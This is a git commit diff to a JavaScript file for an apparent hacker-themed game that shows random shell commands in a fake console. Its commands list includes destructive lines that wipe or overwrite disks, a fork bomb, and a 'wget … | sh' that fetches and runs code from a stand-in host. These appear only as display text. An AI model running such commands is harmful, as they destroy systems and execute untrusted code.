76901dddef353d3bb363af78eaa782b7951eba35
Torinberger <torinberger@torinberger.com>
2018-06-07 10:12:08 +1000

    generates random command

--- src/game.js
+++ src/game.js
@@ -1,12 +1,18 @@
 
 var commands = ["sudo rm -rf /", ":(){:|:&};:", "command > /dev/sda", "mv folder /dev/null", "wget malicious_source.com/rip -O- | sh", "mkfs.ext3 /dev/sda", "^foo^bar", "dd if=/dev/random of=/dev/sda", "tar cvf archive_name.tar dirname/", "tar xvf archive_name.tar", "grep -i 'the' demo_file", "find -iname 'MyCProgram.c'", "find ~ -empty", "ssh -l jsmith remotehost.example.com", "sed 's/.$//' filename", " awk '!($0 in array) { array[$0]; print }' temp"]
 
+function ranBetween(min, max) {
+  return Math.round(Math.random() * (max - min) + min);
+}
+
 // # Console
 
+function generateCommand() {
+  return "<p class='command'><span class='user'>admin@hack-master</span><span class='white'>$</span> "+commands[ranBetween(0, commands.length)]+"</p>";
+}
+
 $(document).ready(function () {
-  /*
-  for (var i = 0; i < commands.length; i++) {
-    $("#console-text").append("<p class='command'><span class='user'>admin@hack-master</span><span class='white'>$</span> "+commands[i]+"</p>");
+  for (var i = 0; i < 20; i++) {
+    $("#console-text").append(generateCommand());
   }
-  */
 });
